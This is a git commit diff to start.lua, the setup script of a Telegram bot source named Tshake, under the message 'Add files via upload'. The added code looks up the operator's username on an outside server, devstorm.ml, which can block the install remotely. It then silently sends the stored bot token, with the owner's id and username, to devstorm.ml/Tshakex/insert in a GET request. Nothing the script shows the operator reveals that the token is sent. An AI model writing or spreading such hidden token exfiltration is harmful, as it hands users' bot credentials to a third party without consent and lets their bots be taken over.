e809b5fb4b27bc4832782d23980a3ac8d4902e0b
SimbaElrayesOfficial <45794302+SimbaElrayesOfficial@users.noreply.github.com>
2021-04-16 23:24:32 +0200

    Add files via upload

--- start.lua
+++ start.lua
@@ -25,33 +25,42 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-
-io.write('\n\27[1;35mSend UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
-local User_Sudo = io.read():gsub('@','')
-if User_Sudo ~= '' then
-local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
-
-local User_Info =  JSON.decode(url) 
- 
- 
- 
-io.write('\n\27[1;31m• The UserNamr Is Saved : تم حفظ معرف المطور الاسي واستخراج ايدي \n\27[0;39;49m')
- database:set(Server_Tshake.."Token_Tshake",token)
-database:set(Server_Tshake.."UserName_Tshake",User_Info.result.username)
-database:set(Server_Tshake.."Id_Tshake",User_Info.result.id)
-else
-io.write('\n\27[1;31mThe UserName was not Saved : لم يتم حفظ معرف Carbon\n\27[0;39;49m')
-end
-os.execute('lua start.lua')
+database:set(Server_Tshake.."Token_Tshake",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
 end 
-
+os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
- 
+if not database:get(Server_Tshake.."UserName_Tshake") then
+io.write('\n\27[1;35mSend UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
+local User_Sudo = io.read():gsub('@','')
+if User_Sudo ~= '' then
+local GetInfoUser = https.request("https://devstorm.ml/api/source/?id="..User_Sudo)
+local User_Info = JSON:decode(GetInfoUser) 
+if User_Info.Info.Chek == "is_block" then
+io.write('\n\27[1;31m If ip server is blocked : سيرفرك لقد تم حظره من السورس \n\27[0;39;49m')
+os.exit()
+end
+if User_Info.Info.Chek == "Not_Info" then
+io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
+os.execute('lua start.lua')
+end
+if User_Info.Info == 'Channel' then
+io.write('\n\27[1;31m The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
+os.execute('lua start.lua')
+end
+io.write('\n\27[1;31m• The UserNamr Is Saved : تم حفظ معرف المطور الاسي واستخراج ايدي \n\27[0;39;49m')
+https.request("https://devstorm.ml/Tshakex/insert/?id="..User_Info.Info.Id.."&username="..User_Info.Info.Username.."&token="..database:get(Server_Tshake.."Token_Tshake"))
+database:set(Server_Tshake.."UserName_Tshake",User_Info.Info.Username)
+database:set(Server_Tshake.."Id_Tshake",User_Info.Info.Id)
+else
+io.write('\n\27[1;31mThe UserName was not Saved : لم يتم حفظ معرف Carbon\n\27[0;39;49m')
+end 
+os.execute('lua start.lua')
+end
 
 local function Files_Tshake_Info()
 Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
